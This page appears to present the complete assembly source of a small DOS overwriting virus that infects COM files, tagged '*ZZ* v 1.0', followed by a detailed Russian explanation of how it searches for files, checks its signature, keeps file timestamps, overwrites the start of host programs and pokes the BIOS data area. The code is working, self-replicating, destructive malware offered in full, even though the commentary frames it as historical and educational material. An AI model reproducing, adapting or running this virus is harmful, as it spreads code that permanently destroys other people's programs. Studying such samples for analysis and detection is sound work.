## Source Code

```asm
code  segment
      assume  cs:code, ds:code, es:code, ss:nothing

	org     0100h


start:  db      8Bh,0DBh   

	mov     ah,4Eh                  
	mov     cx,0000h                
	mov     dx,offset filemask      

loopy:  int     21h
				  
	jb      effect                  
	call    infect                  

	jnz     exit  
	mov     ah,4Fh                  
	jmp     short loopy
	      

exit:   mov     ax,4C00h   
	int     21h            
effect: mov     ax,0040h                
	mov     es,ax                   
	mov     di,004Ah                                           
	mov     al,51h                                            
	stosb                                       
	int     20h                     

infect: mov     ax,3D02h                
	mov     dx,009Eh                

	int     21h                     
	xchg    ax,bx                   
	mov     ah,3Fh                  
	mov     cx,0002h                
	mov     dx,offset ID            

	int     21h                     
	cmp     Word Ptr ds:[016Dh],0DB8Bh
					
	pushf                           
	jz      close_file
	cwd                             
	mov     cx,dx                   
	mov     ax,4200h                
					
	int     21h                                               
	mov     al,00h                  
	mov     ah,57h                  

	int     21h                     
	push    cx                      
	push    dx                      
	mov     ah,40h                  
	mov     cx,007Fh                
	mov     dx,0100h                

	int     21h                     
	mov     al,01h                  
	pop     dx                      
	pop     cx                      
	mov     ah,57h                  
	int     21h                     
close_file: 

	mov     ah,3Eh                  
	int     21h                     
	popf                            
	ret                             


ID:              dw      0000h                   
filemask:        db      "*.COM"         
		 db      00h                     
		 db      "*ZZ* v 1.0"   

code    ends
	end     start 
```

## Описание 
Этот код это 16-битный DOS-вирус, который заражает COM-файлы. Он написан на ассемблере, работает в реальном режиме, использует прерывание int 21h и имеет размер 127 байт (0x7F). Внутри есть метка 8B DB и строка *ZZ* v 1.0, по которой его можно условно назвать «ZZ» или просто безымянным учебным COM-инфектором. Вирус не резидентный, не шифрованный и не полиморфный. Он не остаётся в памяти, а при каждом запуске ищет один незаражённый COM-файл в текущем каталоге, перезаписывает его начало своим кодом и завершается. Из-за перезаписи исходный код хоста теряется, поэтому это разрушающий overwriting-вирус, а не аккуратный паразит.

### Как он запускается

Директива org 0100h означает, что код рассчитан на загрузку COM-файла по адресу CS:0100h. Первые два байта 8B DB это одновременно сигнатура вируса и безобидная инструкция mov bx, bx. Когда заражённый файл запускается, DOS передаёт управление на 0100h, и вирус начинает работу.

### Поиск файлов

Вирус ищет файлы по маске *.COM в текущем каталоге. Для этого он использует DOS-функции:

   - AH=4Eh найти первый файл,

   - AH=4Fh найти следующий файл.

Атрибуты поиска равны нулю, то есть ищутся обычные файлы, без скрытых и системных. Найденное имя файла DOS кладёт в DTA (Disk Transfer Area). По умолчанию DTA находится в PSP по адресу PSP:0080h, а имя файла внутри DTA лежит со смещением 1Eh. Поэтому имя найденного файла оказывается по адресу PSP:009Eh. Именно этот адрес вирус использует при открытии файла: mov dx, 009Eh. Это классический приём экономии места, вирус не хранит имя отдельно, а берёт его прямо из DTA.

### Проверка и заражение

Для каждого найденного файла вызывается процедура infect. Она делает следующее:

   - Открывает файл через AH=3D02h на чтение и запись.

   - Читает первые два байта файла в буфер ID по адресу 016Dh.

   - Сравнивает прочитанное слово с 0DB8Bh. В памяти байты 8B DB читаются как слово DB8B из-за little-endian. Если совпало, файл уже заражён. Вирус закрывает его и возвращает флаг ZF=1.

   - Если файл не заражён, вирус сбрасывает файловый указатель в начало через AH=4200h, CX:DX=0:0.

   - Получает дату и время файла через AH=57h, AL=0, сохраняет их в стеке.

   - Записывает 127 байт из памяти начиная с 0100h в начало файла через AH=40h.

   - Восстанавливает дату и время через AH=57h, AL=1.

   - Закрывает файл через AH=3Eh и возвращает флаг ZF=0, потому что заражение произошло.

После возврата из infect основной цикл проверяет jnz exit. Если ZF=0, то есть был заражён новый файл, вирус завершается через AH=4Ch. Если ZF=1, то файл уже был заражён, и вирус продолжает поиск следующего файла. Таким образом, за один запуск вирус заражает не более одного нового COM-файла, пропуская уже заражённые. Если незаражённых файлов не нашлось или файлов вообще нет, управление уходит на метку effect.

### Что делает effect

Метка effect должна была бы что-то показать на экране, но по факту она пишет байт 51h в память по адресу 0040:004Ah и завершается через int 20h. Сегмент 0040h это область данных BIOS, а не видеопамять. Смещение 4Ah в BIOS data area соответствует полю числа колонок текстового режима. Запись 51h меняет это значение, что может привести к небольшому искажению вывода или другим странностям, но это не «наклон текста», как написано в комментарии. Эффект слабый и почти незаметный.

### Главная особенность: перезапись, а не добавление

Вирус не сохраняет оригинальные первые байты хоста и не дописывает себя в конец. Он просто записывает свои 127 байт в начало файла. После заражения COM-файл при запуске выполняет код вируса, а не исходную программу. Вирус ищет следующий файл, заражает его и завершается. Исходная функциональность хоста теряется навсегда. Поэтому это overwriting-вирус, и его заражение разрушительное, даже если сам код не форматирует диск и не удаляет файлы.

### Слабые места и ограничения

Код очень простой и имеет много ограничений:

   - Работает только с *.COM в текущем каталоге, не спускается в подкаталоги.

   - Не проверяет ошибку открытия файла. Если файл только для чтения или открыть его нельзя, дальше логика может пойти непредсказуемо.

   - Не обрабатывает атрибуты файла, не снимает read-only.

   - Не проверяет размер файла. Если COM-файл короче 127 байт, вирус допишет файл до 127 байт. Если длиннее, просто затрёт начало.

   - Не использует шифрование, полиморфизм, антиотладку или стелс. Обнаружить его можно по первым двум байтам 8B DB или по строке *ZZ* v 1.0.

   - Жёстко зашиты смещения 016Dh, 009Eh, 0100h. Это работает только при фиксированной компоновке и не годится для переноса.

   - Вирус не резидентный, не перехватывает прерывания и не скрывается.

### Вывод

Это учебный DOS-вирус, который демонстрирует классические приёмы файловых инфекторов эпохи MS-DOS: поиск файлов через int 21h, использование DTA для получения имени, проверку сигнатуры, сохранение даты и времени, перезапись начала COM-файла и завершение через DOS. Он не сложный и не опасный для современных систем, потому что DOS почти нигде не используется, а сам вирус разрушает хосты и легко детектируется. Его ценность историческая и образовательная: он показывает, как устроен простейший overwriting COM-инфектор и почему перезапись без сохранения оригинала считается грубым и destructive подходом. Запускать его можно только в изолированном DOS-эмуляторе вроде DOSBox, на отдельной тестовой директории без ценных файлов.
